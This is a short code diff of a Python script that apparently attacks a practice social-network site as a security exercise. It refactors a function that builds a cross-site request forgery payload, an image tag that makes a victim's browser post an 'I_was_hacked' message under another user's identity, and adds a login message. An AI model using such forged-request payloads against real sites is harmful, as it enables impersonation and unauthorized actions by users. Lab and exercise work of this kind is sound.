@@ -286,20 +286,8 @@ def send_multiple_wows(glit_id, count):
 
 
 def xsrf_send_message_to_yourself_from_another_user(publisher_id):
-    msg = (
-        f'<img src="http://glitter.org.il/glit?id=-1&feed_owner_id={user_id}'
-        f'&publisher_id={publisher_id}'
-        f'&publisher_screen_name=hacked_user&publisher_avatar=im1'
-        f'&background_color=White&date={current_time}'
-        f'&content=I_was_hacked&font_color=black">'
-    )
-    path = (
-        f'glit?id=-1&feed_owner_id={user_id}'
-        f'&publisher_id={publisher_id}'
-        f'&publisher_screen_name=kolin%20pom&publisher_avatar=im1'
-        f'&background_color=White&date={current_time}'
-        f'&content={msg}&font_color=black'
-    )
+    msg = '<img src="http://glitter.org.il/glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=hacked_user&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=I_was_hacked&font_color=black">'
+    path = 'glit?id=-1&feed_owner_id=' + user_id + '&publisher_id=' + publisher_id + '&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=' + current_time + '&content=' + msg + '&font_color=black'
     send_and_receive_website("GET", path)
 
 
@@ -308,6 +296,7 @@ def login_website():
     payload = '["' + username + '","' + password + '"]'
     response = send_and_receive_website(method="POST", path=path, data=payload, referer="login")
     if response.status_code == 200:
+        print("Successfully logged in!")
         extract_sparkle_cookie(response.text)
     return response
 
